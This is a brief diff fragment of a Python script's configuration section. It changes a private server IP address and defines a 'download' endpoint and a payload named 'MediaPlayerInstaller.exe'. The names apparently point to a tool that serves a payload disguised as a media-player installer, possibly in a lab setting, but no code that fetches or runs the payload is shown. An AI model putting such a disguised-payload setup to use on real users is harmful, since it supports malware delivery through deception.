@@ -7,7 +7,7 @@ import sys
 
 # ========================================================
 # CONFIGURATION
-SERVER_IP = '10.0.0.1' 
+SERVER_IP = '10.10.1.102' 
 ENDPOINT = 'download' 
 PAYLOAD_NAME = 'MediaPlayerInstaller.exe'
 # ========================================================
